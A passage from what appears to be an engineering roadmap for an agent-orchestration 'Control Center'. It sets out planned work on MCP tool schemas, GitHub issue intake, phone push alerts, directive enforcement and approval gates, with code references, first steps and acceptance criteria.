**Check before building:** No third-party service is involved. Confirm a cron parser that handles time zones and DST, is maintained and has a compatible licence (for example croner or cron-parser), or keep to interval plus a daily/weekly UTC time. Windows sleep and hibernate suspend Node timers, so wake catch-up must be tested. Scheduled Ask digests would run the Ask agent on the operator's subscription and count against the usage window.

### INT-2 · MCP tools agents can actually use: real schemas, tailored tool lists, and a vetted server catalog

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Agents can reach tools from the MCP servers the operator registers, but they never see those tools' real inputs, so they have to guess. Screenshots and other images come back as the text '[image]', and nothing lists the tools for a stage unless the operator is in charge. This work carries each server tool's real input schema and images through to the agent, lets a workflow stage or a repository add tools such as `mcp.playwright.*` to what agents see, and improves capability search so it returns the input shape. It also adds opt-in trust for servers' read-only hints, checks changed tool definitions before exposing them, OAuth sign-in for hosted MCP servers, and a small reviewed catalog of pinned servers. Every call still goes through the same policy and approvals.

**Verified gap:** Every gap the proposal names is real in the code. (1) MCP tools get a generic input: apps/orchestrator/src/tools/mcp.ts:127 `input: z.record(z.string(), z.unknown())`. The server's inputSchema is read at packages/mcp/src/gateway.ts:129 but thrown away when health is stored (mcp.ts:108 keeps only name, description, readOnlyHint and destructiveHint). So sessionTools (service.ts:683 jsonSchemaOf(operation.input)) and find (service.ts:690-706, which returns no schema at all) never show the real inputs.

**First steps**

1. Schema and image fidelity. Store each tool's inputSchema in mcp_servers.health, capped and redacted (apps/orchestrator/src/tools/mcp.ts:108; McpToolView in packages/shared/src/tools.ts). Add an optional `jsonSchema` to ToolOperation (packages/tools/src/sdk.ts) and have jsonSchemaOf/sessionTools prefer it (apps/orchestrator/src/tools/service.ts:157, :683). Validate input against it before the call and return INVALID_INPUT on failure. Make find() include compact schemas for its top 3 hits (service.ts:690). Map MCP png/jpeg image parts to OperationResult.images with a byte cap (packages/mcp/src/gateway.ts:157-159, mcp.ts:135). Tests use the existing stdio fixture server.
2. Tailored tool lists. Add an optional `tools: {include?, exclude?}` to stageDefinitionSchema (packages/shared/src/schemas.ts:98) and a new append-only migration for `repositories.tool_profile`. Resolve a CapabilityProfile object into ToolScope at engine/tooling.ts:133, allowing explicit `mcp.<slug>.*` patterns and rejecting '*'. Remove the dead 'tools.*' from CORE (packages/tools/src/profiles.ts:118). Show where each included pattern came from in apps/dashboard/src/pages/task/ExecutionTab.tsx, using packages/ui components.
3. Server trust controls. Add a migration for `mcp_servers.trust_read_only_hints` and `tool_levels`, plus UI in the ToolsPage.tsx McpTab. Hints set only writes:false; levels change only through operator overrides; both come with policy tests. Add a tool-definition fingerprint so new or changed tools stay 'pending review' after a Check or a list_changed notification. OAuth (loopback PKCE listener, broker-sealed tokens), resources_list/resource_read, BM25-plus-keywords ranking and the pinned catalog (stdio servers first, OAuth-hosted ones after the OAuth slice) come after these three slices.

**Done when:** With the stdio fixture MCP server registered, a workflow stage that declares `tools.include: ['mcp.echo_fixture.*']` gives the agent session a tool list that contains mcp.echo_fixture.echo with the server's real JSON schema, not an empty record. acc_find_capability 'echo' returns that schema. A call with invalid input is refused with INVALID_INPUT before the server runs. An image returned by the server reaches the agent as an MCP image block. A server whose tool description changes after a Check shows 'pending review', and the changed tool is not callable until accepted. New tests prove three things: trusting read-only hints never lowers a tool below the server's level without an operator override, never adds it to an Ask allow-list, and profile `exclude` never overrides policy. `pnpm check` and the Playwright matrix pass in both themes.

**Check before building:** Confirm each of these before building. (1) @modelcontextprotocol/sdk 1.30.0 (packages/mcp/package.json:16; the package is not installed in this checkout, so I could not inspect it): check the StreamableHTTPClientTransport `authProvider`/OAuthClientProvider API, dynamic client registration and refresh, client listResources/readResource, and the tools/list_changed notification handler (or the Client `listChanged` option). (2) Zod ^4.6.5: check whether there is a supported JSON-Schema→validator path (z.fromJSONSchema). If there is not, add ajv as a new dependency. (3) Catalog servers need current package names, pinned versions, transport and auth mode. Playwright MCP (@playwright/mcp, stdio).

### INT-3 · Follow-up backlog from agents' 'Found for Later' notes

**Next** · Effort M · Impact 3/5 · Needs: nothing first

Investigators, planners and implementers already list unrelated problems they noticed under 'Found for Later', but nothing reads those lists, so the findings are lost unless someone reads every report. This initiative collects them into a per-repository backlog, merges duplicates across tasks and adds them to the final report. Each item can be turned into a draft task or dismissed with one click. Repository TODOs, docs 'Known issues' sections and, later, issues, flaky tests and advisories can feed the same list.

**Verified gap:** No code reads the sections: a grep for 'found for later|next recommended' in apps/ and packages/ matches only the prompts and a test fixture (apps/orchestrator/test/targeted-tests.test.ts), with no reader in apps/orchestrator/src. The final report has no such section: the report.ts sections at :177-248 are Requested, Changed, Files changed, Tests, Build, Review, Verification coverage, Execution, Where the time went, Cloud, Git, Remaining limitations, Final status. No backlog table exists (migrations.ts goes up to v19 with no backlog_items).

**First steps**

1. Add extractFoundForLater(markdown) in apps/orchestrator/src/engine/report.ts next to extractOperatorItems. It parses issue, why, fix, priority and affects-this-task; returns [] for 'None'; caps and redacts. Unit tests use real investigation, plan and implementation-report samples.
2. Add an append-only migration for backlog_items (source, repository_id, title, body, location, priority, first_seen_at, last_seen_at, occurrences, hash, status, task_id) with store methods. Harvest in ArtifactService.write (services/artifacts.ts:53) for the investigation, plan and implementation-report types, deduped by normalized hash, and add a 'Found for later' section to the final report in report.ts.
3. Add routes to list, dismiss and convert items (convert = engine.createTask start:false with the item fenced) and a Backlog tab in apps/dashboard/src/pages/RepositoryDetailPage.tsx built from packages/ui DataTable with semantic tokens. The Playwright matrix stays green in both themes.

**Done when:** After a task whose plan lists two Found-for-Later items, both appear in the repository's Backlog tab and in the task's final report. The same item raised by a later task increments occurrences rather than duplicating. A 'None' section adds nothing. 'Create draft' produces a DRAFT task whose description holds the item inside an untrusted fence and marks the item converted. 'Dismiss' hides it. Converted items close when their task completes.

**Check before building:** Nothing third-party. Claude Code and Codex follow the one-line-per-item format loosely (bullets, tables, bold, 'None.'), so the parser must be tolerant and tested on real samples from existing artifacts.

### INT-4 · Design and doc links as frozen task context (images to agents, Figma and Notion snapshots)

**Later** · Effort M · Impact 3/5 · Needs: nothing first

Screenshots and design frames attached to a task reach agents that can see images, so a UI task is built against the actual design rather than a file path. The operator can also link a Figma frame, a Notion page or a public URL. The Control Center fetches it once through a read-only tool, keeps a dated local snapshot so every retry sees the same input, and puts it in the prompt as clearly marked outside data. The App check can then show the screenshot next to the linked frame.

**Verified gap:** Non-text attachments reach agents only as a path (apps/orchestrator/src/engine/context.ts:317-332). AgentExecutionInput.images exists (packages/agent-sdk/src/contract.ts:114) and the Codex adapter supports it (packages/agent-codex/src/index.ts:132 images:true, :185 `-i`), but StageRunners.launchAgent (engine/runners.ts:524-575) never sets images. No Figma, Notion or Google Docs provider exists: builtinProviders (packages/tools/src/index.ts:50-73) has none, and a grep for figma or notion finds nothing.

**First steps**

1. In engine/context.ts and runners.ts launchAgent (:524), collect image attachments (png/jpeg/webp, at most 4 and a size cap) and pass them as `images` when the adapter's capabilities report images:true (Codex -i), keeping paths for others. Add a test with the fake Codex binary asserting the -i arguments.
2. Add optional contextLinks (https URLs, at most 5) to createTaskSchema (schemas.ts:302). Before the first agent stage, resolve them through ToolService.invoke('web.read') into a new local-only 'context-link' artifact (added to LOCAL_ONLY_ARTIFACTS at remote.ts:219) recording URL, fetchedAt and sha256. Render it fenced in a new {{context_links}} placeholder (packages/shared/src/prompts.ts:8).
3. Add packages/tools/src/packs/design-docs.ts with figma.frame (level 1, readOnly, credential kind 'figma', networkTargets api.figma.com plus the image host; node text and sizes plus a 2x PNG) and notion.page (blocks to markdown), registered in builtinProviders. Add figd_ and Notion token redaction patterns with tests, and loopback stand-in API tests.

**Done when:** A task with a PNG attachment run on Codex passes it with -i, visible in the recorded execution arguments. A task linked to a Figma frame gets one snapshot artifact (PNG plus node summary, with fetch time and hash) that retries reuse unchanged, and it appears in the prompt only inside the context-links fence. The snapshot is classified local_only and never uploads to the cloud. Figma and Notion tokens are redacted in logs. When a frame is linked to a verifyPath, browser-verification.md shows the App check screenshot beside the frame.

**Check before building:** Figma REST: personal access token in the X-Figma-Token header with the file_content:read scope. Since late 2025 rate limits are tiered by plan and seat, and View/Collab seats get very low limits on the endpoints this needs (GET /v1/files, /v1/files/:key/nodes and /v1/images are Tier 1), so confirm the operator's seat before relying on it. Image URLs expire and are on another host. The Figma Dev Mode MCP server (local 127.0.0.1:3845 or remote) needs a Dev or Full seat and the gateway's image passthrough. Notion API: an integration token plus the Notion-Version header; each page must be shared with the integration; blocks paginate at 100 per page; about 3 requests/s.

### INT-5 · Issue-linked tasks: start from an issue, keep it updated, traceable commits (GitHub first, neutral tracker seam)

**Later** · Effort L · Impact 3/5 · Needs: SEC-4

Lets the operator start a task from a GitHub issue. The task stays linked to the issue: it shows a badge, its commits carry a descriptive subject and a 'Refs #N' trailer, and, if the operator opts in, the issue gets comments when work starts, is ready and goes live. The code sits behind neutral tracker.* ids with GitHub as the first provider, so Linear, Jira and GitLab can be added later as providers without changing the engine. Today every task commit says 'TASK-0042: title' and nothing reports back to the issue.

**Verified gap:** Everything that talks to a forge is GitHub-only. packages/tools/src/index.ts:50-73 registers only githubProvider (packs/github.ts: gh CLI, pr_list/pr_view/pr_checks/issue_list/issue_view/run_list at level 1, pr_create/issue_create/issue_comment at level 3, secret_put at level 4) and githubApiProvider (packs/github-api.ts, read-only: github.issues :260, github.runs :293). No GitLab, Gitea/Forgejo, Linear or Jira provider exists: a grep shows 'gitlab' only in redact.ts:36, env-guard.ts:69 and source-control/preflight.ts:18, and finds no linear, jira or gitea at all.

**First steps**

1. Add an append-only migration for task_links(task_id, system, external_id, url, role) with store methods, and an optional `issue: {system:'github', repo, number}` in createTaskSchema (packages/shared/src/schemas.ts:302). Add 'Start from issue' to apps/dashboard/src/pages/NewTaskPage.tsx: it reads the issue through ToolService.invoke('github.issues') with operator origin, seeds the description with fenceEvidence and stores the link. Show a 'From GitHub #N' badge in components/task-row.tsx next to the connected-app badge (:67).
2. Add a pure buildCommitMessage(task, stages, links) in apps/orchestrator/src/engine (new commit-message.ts). It takes the subject (at most 72 chars) from the plan or implementer stage summary, redacts it, adds a 'Refs #N' trailer and falls back to today's message. Use it at runners.ts:1392 and tooling.ts:488, with unit tests.
3. Add an opt-in IssueSyncService (apps/orchestrator/src/services/issue-sync.ts) modelled on alerts.ts:102-106. It posts github.issue_comment on TASK_STARTED, READY, RELEASE_LIVE (with URL and commit) and TASK_FAILED, only when the repository opted in and the effective auto-approve level is at least 3; otherwise it records a 'not posted' task event. Then define tracker.issue_read and tracker.comment ids with a github provider, and add Linear and Jira providers only after I22.

**Done when:** A task created from GitHub issue #N (tests use a loopback stand-in API) shows 'From GitHub #N'. Its checkpoint commits have a summary-derived subject of at most 72 chars and a 'Refs #N' trailer. With sync enabled, the issue receives exactly one comment each for start, ready and live (live names the URL and commit). With sync off, or auto-approve below 3, nothing is posted, no approval is created and a task event says why. The issue body appears in the prompt only inside an untrusted_evidence fence.

**Check before building:** GitHub: there is no in-progress issue state (use labels or a Projects v2 field, which needs the project scope over GraphQL). A 'Fixes #N' trailer auto-closes the issue when the commit reaches the default branch, and the push release method fast-forwards main, so use 'Refs #N' and close on RELEASE_LIVE. GitLab REST v4: PRIVATE-TOKEN or Bearer PAT; merging a merge request is PUT /projects/:id/merge_requests/:iid/merge; approvals and pipelines are shaped differently from GitHub checks. Gitea/Forgejo API v1 uses the 'Authorization: token'.

### INT-6 · GitHub intake: labelled issues and red main-branch runs become draft tasks

**Later** · Effort L · Impact 3/5 · Needs: INT-5

Per repository, the Control Center polls GitHub on its existing timer. Each newly labelled issue, and each failed run on the default branch, becomes a draft task with the issue text or the failing job's log attached as untrusted data, so work that starts on GitHub is no longer retyped. Nothing starts on its own, duplicates are suppressed, and only this machine can turn intake on. A sealed cloud webhook inbox for push-only services such as Sentry comes in a later phase, when a paired cloud exists.

**Verified gap:** No intake service or inbound event path exists. apps/orchestrator/src/services has no intake.ts or inbox.ts. The cloud Worker routes only /node/v1/* on relay hosts and everything else to the Access-protected control host (apps/cloud-control/src/index.ts:28-37), routes/ holds only control.ts and relay.ts, and D1 has one migration (migrations/0001_control_plane.sql). A grep for 'webhook|inbox' matches only the outbound messenger in services/alerts.ts:44 and credential-generation text (tools/credentials.ts:31).

**First steps**

1. Add an append-only migration for intake_items(source, external_id, repository_id, task_id, first_seen_at), unique on (source, external_id, repository_id). Add an optional `intake` object to updateRepositorySchema (packages/shared/src/schemas.ts:274): github {label, mode draft|discuss, authors?} and ci {defaultBranchFailures}. Extend remote/guards.ts:76 so that enabling intake, or choosing a mode other than draft, is refused remotely.
2. Add apps/orchestrator/src/services/intake.ts, scheduled like RepositoryAutomation.schedule (repository-automation.ts:210) and wired in app.ts/main.ts. For each opted-in repository it derives owner/repo with normalizeRemote, calls ToolService.invoke('github.issues', {label}) and 'github.runs' (default branch, conclusion failure) with engine origin and the repository scope, and creates DRAFT/Discuss tasks through engine.createTask({start:false}) with fenceEvidence bodies. It stores the link in I33's task_links and dedupes through intake_items.
3. Add an Intake panel in apps/dashboard/src/pages/RepositoryDetailPage.tsx (packages/ui components, semantic tokens) showing the last poll, the items found and errors, plus a 'From GitHub #N' / 'From CI run' badge in components/task-row.tsx.

**Done when:** With intake enabled for a repository, and against a loopback stand-in GitHub API in tests: one labelled issue produces exactly one DRAFT task with the issue fenced as untrusted evidence, and one failed default-branch run produces exactly one DRAFT with the failing job's log tail. A second poll creates nothing new. Issues from authors outside the allow-list are ignored. A remote request to enable intake is refused with a machine-only message. No intake item ever starts a task.

**Check before building:** GitHub REST: 5,000 requests per hour per PAT. Conditional requests with If-None-Match/ETag that return 304 do not count against the primary limit (rest.ts passes arbitrary headers, so the ETag can be cached per query). Label filtering is by name. Edited or reopened issues keep their number, so dedupe on (repo, number). Webhooks: X-Hub-Signature-256 is HMAC-SHA256 over the raw body; GitHub expects a 2xx within 10 s; payloads can reach 25 MB, so a 256 KB cap drops some push payloads (issues and workflow_run payloads are usually small). Linear-Signature is HMAC-SHA256 hex with a webhookTimestamp in the body for replay checks.

## NTF — Notifications and remote control

### NTF-1 · Reach the phone when the desk PC can't: cloud Web Push, node-offline watchdog, pluggable alert channels

**Next** · Effort L · Impact 4/5 · Needs: nothing first

Today the running machine is the only thing that sends phone alerts. If it crashes or loses network in the middle of a task, nobody finds out. This adds opt-in browser push from the cloud dashboard for approvals, decisions and failures. It also adds a watchdog that pushes 'Desk PC went offline with TASK-12 running' when a node stops sending heartbeats. Separately, alerts get a small channel layer (the existing messenger, ntfy, Slack/Discord/Telegram webhooks), with per-kind routing and quiet hours. Every channel is outbound-only and its secrets stay in the broker, so no chat account can act as a remote control.

**Verified gap:** Gap confirmed, but the problem statement overstates it. apps/orchestrator/src/services/alerts.ts:45 hard-codes INGEST_PATH. config() at :96-99 reads only settings.notifications.phone, and post() at :213-240 is the only sender. packages/shared/src/schemas.ts:495-503 has one phoneAlertsSchema, nested at :513-520. A repo-wide grep for serviceWorker/VAPID/PushManager/ntfy/telegram/slack/discord/getUpdates finds no implementation. The only hit is a test at apps/dashboard/e2e-cloud/cloud.spec.ts:251 that asserts there is NO service-worker controller.

**First steps**

1. Cloud Web Push sender. Add apps/cloud-control/migrations/0002_push.sql (push_subscriptions keyed by Access email, push_sent for dedupe) and apps/cloud-control/src/push.ts (VAPID ES256 plus RFC 8291 aes128gcm, with a unit test against the RFC vector and a push-host allowlist). Add GET/POST/DELETE /api/cloud/push/subscriptions to routes/control.ts cloudApi, with the VAPID public key in /api/cloud/session. Add a trigger in the hub.ts event.batch loop (:352) for pending approvals and tasks entering WAITING_FOR_USER or FAILED; the payload carries only the task id and a generic phrase.
2. Node-offline watchdog. hub.ts alarm (:533) schedules min(hourly renewal, offline check). A node is 'gone' on nodeGone OR when nodes.last_seen_at is older than about 3 heartbeats (heartbeatMs 30 s, apps/orchestrator/src/remote/service.ts:76) while cloud_tasks has RUNNING rows for it. Send one push per outage, deduped in push_sent. Tests in apps/cloud-control/test.
3. Dashboard opt-in. Add apps/dashboard/public/sw.js with push and notificationclick handlers only. Register it only from a SettingsPage 'This device' Switch (packages/ui) in cloud mode, and have the local server 404 /sw.js. cloud.spec.ts keeps the no-controller assertion for the default path and adds an opt-in case asserting there is no fetch listener, in both themes. A follow-up PR adds the AlertChannel refactor of alerts.ts (messenger, ntfy, webhook kinds, notifications.channels[], ALERT_SENT.channel) plus the guards.ts rule and its tests.

**Done when:** With a phone subscribed, pulling the desk PC's network during a running task shows 'Desk PC went offline with TASK-n running' on the phone within about 2 minutes, exactly once per outage. A new pending approval or decision on a connected node shows a push that carries only the task id and a phrase, and tapping it opens /tasks/:id behind Access. The RFC 8291 vector test passes. pnpm e2e:cloud is green in both themes: with no service-worker controller unless opted in, and with no fetch listener when opted in. The existing phone-alert tests pass unchanged. A remote settings.update that adds a channel or redirects one is refused, and a test covers it.

**Check before building:** Web Push: RFC 8292 VAPID (ES256 JWT, aud = the endpoint origin, exp ≤ 24 h) and RFC 8291 aes128gcm. Needs WebCrypto ECDH P-256 deriveBits, HKDF, AES-GCM and ECDSA P-256 in the Workers runtime; confirm, and test against the RFC 8291 §5 vector. Push-service hosts to allowlist: fcm.googleapis.com (Chrome/Android), updates.push.services.mozilla.com, web.push.apple.com (iOS/iPadOS 16.4+ only for Home-Screen-installed PWAs; Access redirects there use a separate cookie jar per MOBILE_PWA_PLAN.md), *.notify.windows.com (Edge). Confirm their TTL, Urgency and size limits (~4 KB) and their 410 semantics. Chrome requires userVisibleOnly:true, so every push must show a notification.

### NTF-2 · One-tap answers for 'needs your decision' blockers

**Next** · Effort M · Impact 3/5 · Needs: nothing first

When an agent stops to ask a question, it can now list up to four answer options and mark one as recommended. The Control Center stores them with the blocker. The Answer dialog shows them as buttons, and phone alerts and VS Code toasts list them with a link or pick-list that opens the answer already filled in. The operator answers in one tap instead of typing, and the answer still goes through the existing directive path, so nothing is approved or waived without the usual checks.

**Verified gap:** Partly built. packages/shared/src/types.ts:41-49 TaskBlocker has no options field. apps/orchestrator/src/engine/report.ts:77-84 extractOperatorBlockers returns plain strings. engine.ts:1346-1351 joins several questions into one message. A grep for blocker.options, RECOMMENDED:, answerBlocker and DecisionOption finds nothing.

**First steps**

1. Add TaskBlocker.options?: {id,label,answer,recommended}[] in packages/shared/src/types.ts. Add a parseOperatorBlocker in apps/orchestrator/src/engine/report.ts that reads 'OPTION n: &lt;label>' lines after a BLOCKED line plus 'RECOMMENDED: n', redacted and capped. Carry the options through runners.ts:429 and stage-team.ts:881, and have engine.ts:1349 set them only when there is exactly one question. Unit tests in apps/orchestrator/test.
2. Document the optional OPTION/RECOMMENDED lines in prompts/implementer.md, fixer.md, planner.md and investigator.md, and in the context.ts:39 RUN_CONTEXT line. Make simulated.ts [sim:needs-decision] emit two options. dialogs.tsx renders option buttons that prefill 'Your answer', and TaskDetailPage reads ?answer=&lt;id> to open the prefilled dialog. Add a Playwright case in both themes.
3. alerts.ts body() lists 'Options: 1) … 2) …' and the deep link becomes /tasks/:id?answer=&lt;recommended>. In extension.ts maybeNotify, a decision blocker gets an 'Answer…' QuickPick that posts the directive through the existing API.

**Done when:** A [sim:needs-decision] task stops with blocker.options set. The Answer dialog shows the options with the recommended one marked. Clicking one fills 'Your answer' without submitting, and submitting resumes the task through the ANSWER directive. The phone alert lists the options, and its link opens the dialog prefilled. The VS Code toast offers 'Answer…' with the same options. A blocker with no OPTION lines behaves exactly as today. pnpm e2e is green in both themes.

**Check before building:** Check that Codex CLI and Claude Code reliably emit the extra OPTION/RECOMMENDED lines when asked, using pnpm verify:agents --run with a decision prompt. The free-text BLOCKED line must keep working when they do not. The VS Code QuickPick and showWarningMessage APIs are standard.

### NTF-3 · Cloud mirror that forgets deleted work, and automatic node choice that avoids busy or capped machines

**Later** · Effort M · Impact 2/5 · Needs: nothing first

After a long disconnection or a database restore, the cloud copy can still show tasks that were deleted or approvals that were already answered. The phone then shows ghost work while the PC is offline. This makes each full resync also send a list of what still exists, so the cloud removes what is gone. When several machines are paired, automatic routing starts preferring the machine that is less busy and whose Claude or Codex allowance is not used up, and it says why it chose that machine. The routing half matters only once a second machine is paired, so it can wait.

**Verified gap:** Real, but narrower than stated. Node side: apps/orchestrator/src/remote/store.ts:66-67 sets OUTBOX_LIMIT=10_000. :202-214 enqueue coalesces per entity key, and on overflow drops the oldest rows and sets resync_required. apps/orchestrator/src/remote/service.ts:671-704 enqueueFullResync upserts only the newest 500 tasks (RESYNC_TASKS :88) and only pending approvals, and sends no tombstones or manifest. Cloud side: apps/cloud-control/src/store.ts:387-391 deletes only on an explicit task.deleted.

**First steps**

1. Resync manifest. In apps/orchestrator/src/remote/service.ts enqueueFullResync, also re-send all non-terminal tasks regardless of age, then enqueue a 'manifest' message {taskIds, pendingApprovalIds}, chunked. apps/cloud-control/src/store.ts eventStatements handles it by deleting that node's cloud_tasks and cloud_task_events rows not in the set, and by marking mirrored pending approvals not in the set as no longer pending (json_each, scoped by node_id). Keep it out of hub fan-out. Tests: outbox overflow with a task deleted and an approval resolved, and an F-22 restore, both asserting that D1 converges.
2. Load data. In an append-only D1 migration, add nodes.active_tasks, outbox_depth and load_at, written in the hub.ts heartbeat touch branch. nodeCapabilitiesSchema.agents[] gets optional capacityBlocked and resetsAt, filled from capacityBlock and capacity snapshots, and capabilities are re-sent when agents change. CloudNodeView gets optional fields, and NodesPage.tsx shows load and capacity badges.
3. resolveNode scoring in routes/control.ts: fingerprint present, no active lease, not all subscription agents capacity-blocked, fewest active tasks, then the source node. Add an x-acc-routed-reason header shown on NewTaskPage.tsx, and have the offline banner show 'as of &lt;lastSeenAt>'.

**Done when:** In a node and cloud test that overflows the outbox while a task is deleted and an approval is resolved, D1 holds neither the deleted task nor a pending copy of the approval after reconnect. A restored older node database removes the cloud rows the node no longer has. With two online nodes holding the same repository, an automatic New Task goes to the node that has no capacity-blocked agents and fewer active tasks, and the response names the reason. Nodes on the previous version still sync and route unchanged.

**Check before building:** D1 allows at most 100 bound parameters per statement, so pass id sets as a single JSON parameter through json_each and chunk large manifests. Confirm the D1 batch size and duration limits for large deletes. Durable Object WebSocket messages are capped around 1 MiB, matching REMOTE_LIMITS.frameBytes and batchBytes (900 KB).

## UX — Operator experience

### UX-1 · Enforced directives from every surface, in French too

**Now** · Effort M · Impact 4/5 · Needs: nothing first

A directive like 'don't touch the migrations' is checked at completion only when typed into Chairman chat. The same sentence typed in the task's Directive box, in VS Code, from the phone or in French stays advice that nothing enforces. This derives the checkable rule on every surface, shows the operator before sending whether a directive will be checked and which files it protects, and adds French phrasing. It also enforces those rules on tasks that run without the Chairman, so the operator's hard constraints are always real.

**Verified gap:** Gap confirmed. deriveRule (apps/orchestrator/src/chairman/rules.ts:33-45) is called only from intent.ts (:125, :227, :244). directiveFromWords (intent.ts:243-249) is used only by Chairman chat (chat.ts:236). The directive route is `command('directives', (id, body) => engine.addDirective(id, directiveSchema.parse(body)))` (apps/orchestrator/src/http/routes.ts:188). directiveSchema accepts only an optional waive_check rule (packages/shared/src/schemas.ts:349-357), and engine.addDirective defaults kind to 'instruction' and rule to null (engine.ts:498-517).

**First steps**

1. In apps/orchestrator/src/http/routes.ts:188, run directiveFromWords on the text when no rule is supplied, and store the derived kind and rule. Widen directiveSchema.rule (packages/shared/src/schemas.ts:352) to waive_check | protect_paths | require_check, tighten-only. Add tests covering chat, the dialog and remote bodies, and proving routing rules are still refused.
2. Add a read-only POST /api/directives/preview {text, repositoryId} that returns {kind, rule, matchedFiles (capped)} using rules.ts matchesAny over tracked files. The DirectiveForm (apps/dashboard/src/pages/task/dialogs.tsx) and the Overview/ChairmanDrawer directive lists show 'Checked at completion: protects …' or 'Advice only', using packages/ui components and semantic tokens.
3. Add French negations, nouns and 'toujours lancer …' patterns to rules.ts and the constraint regex in intent.ts:247, with a two-way table (should/should-not derive) in apps/orchestrator/test/chairman-units.test.ts. Then enforce protect_paths/require_check for unsupervised tasks at engine.ts:907.

**Done when:** Typing 'ne touche pas aux migrations' in the Task Detail Directive box shows 'Checked at completion: protects **/migrations/** (N files)' before sending. After sending, the directive list shows it as enforced, and a task that then edits a migration file cannot complete: it goes back to Fix on a supervised task, or stops for the operator on an unsupervised one. The same sentence from VS Code or the phone produces the same stored rule. A sentence with no recognisable pattern is labelled 'Advice only'.

**Check before building:** None third-party. The French phrasing table (ne … pas, jamais, évite de, toujours lancer…) should be reviewed by a native speaker against real operator directives. Darija/Arabic coverage is deferred.

### UX-2 · Gate preview, up-front approvals and remembered consent

**Next** · Effort L · Impact 5/5 · Needs: nothing first

Before a task starts, New Task shows how many times it is expected to stop for approval and why: commands above the auto-approve level, stages that always ask, plan review and release. It also shows whether the task will queue behind another task in the same repository. The operator can approve the predictable, non-typed gates in one step, so an evening task does not stall at each gate. Later, a repository-scoped, expiring 'approve and remember' covers the same unchanged command or stage in future tasks. Dangerous, Level 5, production and release gates always ask at the time.

**Verified gap:** Gates are found one at a time. gateCommand (runners.ts:1078-1113) and stageGate (engine.ts:1016-1052) each create a pending approval only when the gate is reached. findApproval always filters on task_id (store/store.ts:1192-1209), so consent never carries over to another task. ApprovalGate offers only state, pending, request, requestDetached and park (engine/approvals.ts); there is no preApprove or grant. There is no preview route (routes.ts has only POST /api/tasks at :166). New Task offers only an auto-approve level select (NewTaskPage.tsx:431-436).

**First steps**

1. Add apps/orchestrator/src/engine/gate-preview.ts with a pure predictGates(workflow, repo, settings, overrides). It uses classifyCommand(expandPackageScripts(repo.path, …)), alwaysRequiresApproval, each stage's requiresApproval and permissionLevel against the auto-approve level, and the plan_review, skip_tests, app-check and release gates, and marks narrowed test commands 'will ask'. Unit-test it against every workflow in /workflows. Add POST /api/tasks/preview in routes.ts, adding repositoryHolder and agent capacityBlock.
2. Add ApprovalGate.preApprove(task, gates) in engine/approvals.ts. It inserts approved rows keyed exactly as gateCommand and stageGate match them ({command: redact(line)} for non-strong commands, {stageKey} for stages), with the note 'approved when the task started' and an APPROVAL_RESOLVED event. Add an optional preApprove list to createTaskSchema, refused in remote/guards.ts. Add a 'This task will stop N times / Approve these now' panel in NewTaskPage.tsx built from packages/ui.
3. Migration 20: approval_grants (repository NOT NULL, kind command|stage_permission, match = redacted command plus classifier level and reasons, or workflow plus stage key; max_level ≤ 4; expires ≤ 30 days; max_uses; uses; revoked_at). Add ApprovalGate.grantFor(), called before request(), and a Settings → Execution policy list with revoke. Leave the decide() capability grant for a later slice with per-branch tests in packages/tools.

**Done when:** Take a repository whose test command classifies at Level 3 with auto-approve at 2. New Task shows 'will stop 2 times', naming the command and the stage. With 'Approve these now', the task finishes with no WAITING_FOR_USER time for those gates, and Approvals lists them as 'approved when the task started'. Release, dangerous and Level 5 gates still ask with a typed phrase. A grant for that command lets the next task in the same repository pass without asking, and the grant's use count increments. Editing the package.json script so the classification changes makes it ask again, and a revoked or expired grant stops applying at the next gate. Remote preApprove or grant creation is refused with 403. predictGates and each decide() branch have unit tests.

**Check before building:** No third-party dependencies. Internally, a grant matches on the classifier's level and reasons text, so a future classifier change silently invalidates grants. That fails closed and the task asks again, which is acceptable but should be documented.

### UX-3 · Line comments on a task's changes, and follow-up tasks

**Later** · Effort L · Impact 4/5 · Needs: DLV-2

The operator can comment on specific lines in a task's Changes tab. With the opt-in 'Review changes before commit', the task stops once verification passes. 'Request changes' sends the open comments to the fixer as one directive naming path:line, and the fix, test and verify loop runs again; 'Approve' completes the task. After a task completes, 'Request follow-up changes' starts a linked quick-change task on that task's branch, carrying its report and comments. Small corrections then no longer need a fresh task that has lost the branch and the context.

**Verified gap:** Nothing like it exists. A search for review_comment|change_review|followUpOf|follow_up_of across the repo finds nothing (the only 'followUp' is a local variable at runners.ts:448). APPROVAL_KINDS lists only stage_permission, plan_review, command, skip_tests and release (packages/shared/src/constants.ts:171). Only plan_review turns a deny into a directive plus a goto (engine.ts:772-778); every other deny sets the task to FAILED (engine.ts:794-798). COMPLETED is not in RESUMABLE (engine.ts:87), and addDirective throws on terminal tasks (engine.ts:502-503).

**First steps**

1. Migration 20: an append-only review_comments table (task, repository, path, line range, side, redacted and capped body, state open|resolved|outdated) and tasks.follow_up_of. Add GET/POST /api/tasks/:id/comments in apps/orchestrator/src/http/routes.ts, validating that the path is one of the task's changed files (repositoryChanges) and the range fits the diff. Add a comment gutter to apps/dashboard/src/pages/task/ChangesTab.tsx built from packages/ui components.
2. Add 'change_review' to APPROVAL_KINDS and reviewChanges to createTaskSchema. In engine.ts handleOutcome, request change_review when def.next is 'complete' (or the next stage is kind git). In resolveApproval, a deny adds one directive listing the open comments as path:line plus text, sets currentStageKey to the review stage's onFail and increments fixCycles (raising maxFixCycles if needed). Comments whose lines changed are marked outdated. Engine tests cover approve, deny and deny at the fix limit.
3. Add an optional base to addWorktree (packages/git/src/worktrees.ts) and pass it through tooling.createWorktree. Add POST /api/tasks/:id/follow-up, which creates a quick-change draft based on the completed task's taskBranch tip, with final-report.md and the open comments attached and follow_up_of set. Add 'Request follow-up changes' to task-actions.tsx for COMPLETED tasks.

**Done when:** A task created with 'Review changes before commit' reaches WAITING_FOR_USER with a change_review approval after verify passes. Two line comments plus 'Request changes' produce one directive naming both path:line entries, a fix cycle runs (fixCycles +1, even at the limit), and the gate asks again with the moved anchors shown as outdated. Approve completes the task, and its branch holds the fix. On a COMPLETED task, 'Request follow-up changes' creates a linked task whose worktree HEAD equals the first task's branch tip and whose attachments include its report. Engine unit tests and the Playwright matrix pass in both themes.

**Check before building:** Only VS Code APIs, for a later slice: comments.createCommentController, TextDocumentContentProvider and the vscode.diff command. All are stable in engine ^1.95 (apps/vscode-extension/package.json:9). No third-party services.

### UX-4 · Smarter Chairman chat, more Ask analytics, and opt-in Ask from the phone

**Later** · Effort L · Impact 4/5 · Needs: nothing first

